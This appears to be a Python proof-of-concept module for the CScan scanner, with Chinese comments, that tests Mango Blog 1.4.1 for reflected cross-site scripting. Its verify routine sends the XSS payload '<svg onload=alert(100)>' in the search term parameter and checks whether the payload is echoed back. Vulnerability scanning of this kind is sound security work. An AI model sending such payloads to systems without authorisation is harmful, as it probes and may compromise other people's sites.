# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'mangoblog_0001_p_bb2' # 平台漏洞编号，留空
    name = 'Mango Blog 1.4.1 /archives.cfm/search XSS跨站脚本漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        Mango Blog没有正确地过滤提交给archives.cfm/search页面的term参数便返回给了用户，
        远程攻击者可以通过提交恶意参数请求执行跨站脚本攻击，导致在用户浏览器会话中执行任意HTML和脚本代码。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-87080' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'MangoBlog'  # 漏洞应用名称
    product_version = '1.4.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a97d913a-ea25-4349-9e91-0eb97f2213dd'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            
            verify_url = '{target}'.format(target=self.target)+'/archives.cfm/search/?term=%3Csvg%20onload=alert(100)%3E'
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if '<svg onload=alert(100)>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()
        

if __name__ == '__main__':
    Poc().run()
